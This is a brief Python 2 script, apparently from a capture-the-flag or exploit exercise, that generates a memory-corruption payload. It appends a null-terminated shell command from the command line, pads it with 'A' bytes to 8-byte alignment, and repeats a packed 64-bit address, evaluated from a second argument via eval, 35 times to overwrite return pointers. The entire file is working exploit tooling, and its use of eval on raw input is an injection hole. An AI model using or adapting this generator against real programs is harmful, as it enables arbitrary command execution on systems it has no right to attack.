#!/usr/bin/env python

import sys
import struct

shell = sys.argv[1] + chr(0)
padding = 8 - (len(shell) % 8)

# sys.stderr.write("payload length: %d\n" % len(shell))
# sys.stderr.write("padding length: %d\n" % padding)

padding = padding * 'A'

f = eval(sys.argv[2])  # lol

print shell + padding + struct.pack('<q', f) * 35
